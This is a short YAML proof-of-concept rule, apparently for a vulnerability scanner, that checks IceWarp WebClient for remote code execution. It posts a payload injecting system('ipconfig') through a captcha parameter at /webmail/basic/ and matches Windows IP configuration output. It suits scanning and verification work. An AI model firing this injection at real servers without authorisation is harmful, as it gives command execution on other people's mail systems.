name: poc-yaml-icewarp-webclient-basic-rce
rules:
  - method: POST
    headers:
      Content-Type: application/x-www-form-urlencoded
    path: /webmail/basic/
    body: _dlg[captcha][target]=system(\'ipconfig\')\
    expression: |
      response.status == 200 && response.body.bcontains(b"Windows IP Configuration") && response.body.bcontains(b"IPv4 Address")
detail:
  author: B1anda0(https://github.com/B1anda0)
  links:
